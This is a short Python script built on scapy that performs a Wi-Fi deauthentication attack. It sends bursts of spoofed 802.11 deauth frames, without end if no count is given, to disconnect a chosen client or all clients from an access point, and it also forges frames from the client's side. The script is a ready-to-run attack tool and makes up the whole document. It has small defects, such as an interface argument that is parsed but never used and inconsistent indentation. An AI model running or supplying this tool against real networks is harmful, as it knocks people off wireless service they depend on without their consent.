#!/usr/bin/python
import argparse
from sys import exit
from scapy.all import *

# Credit: https://gist.githubusercontent.com/jordan-wright/4576966/raw/5f17c9bfb747d6b2b702df3630028a097be8f399/perform_deauth.py
def deauth(bssid, client, count):
    pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    cli_to_ap_pckt = None
    if client != 'FF:FF:FF:FF:FF:FF':
        cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
    print 'Sending Deauth to ' + client + ' from ' + bssid
    if not count: print 'Press CTRL+C to quit'
    # We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
    while count != 0:
        try:
            for i in range(64):
                # Send out deauth from the AP
                send(pckt,verbose=0)
		print 'Sent one 64 packet deauth burst to' + client
                # If we're targeting a client, we will also spoof deauth from the client to the AP
                if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt)
            # If count was -1, this will be an infinite loop
            count -= 1
        except KeyboardInterrupt:
            break


def main():
   parser = argparse.ArgumentParser(description='deauth.py - Deauthticate clients from a network')
   parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='Interface to use for deauth')
   parser.add_argument('-b', '--bssid', dest='bssid', type=str, required=True, help='BSSID of the access point')
   parser.add_argument('-c', '--client', dest='client', type=str, required=True, help='MAC of the client being DeAuthenticated')
   parser.add_argument('-n', '--packets', dest='count', type=int, required=False, help='Number of DeAuthentication packets to send')
   args = parser.parse_args()

   deauth(args.bssid, args.client, args.count)

   exit(0)


if __name__ == '__main__':
    main()
